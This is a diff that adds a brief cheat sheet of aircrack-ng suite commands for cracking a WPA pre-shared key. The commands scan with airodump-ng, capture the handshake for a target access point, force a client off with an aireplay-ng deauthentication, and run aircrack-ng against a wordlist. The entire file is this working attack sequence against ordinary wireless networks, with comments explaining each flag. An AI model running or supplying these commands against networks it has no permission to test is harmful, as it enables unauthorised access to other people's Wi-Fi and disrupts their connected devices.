@@ -1,0 +1,11 @@
+#Scan the networks
+airodump-ng wlan1
+
+#Start the capture -w = logfile --bssid = AP MAC address -c = Channel
+airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan1
+
+#Deauth -a = AP -c = Assoicatied Client
+aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan1
+
+#Crack the password -w = wordlist -b bssid capfile.cap
+aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
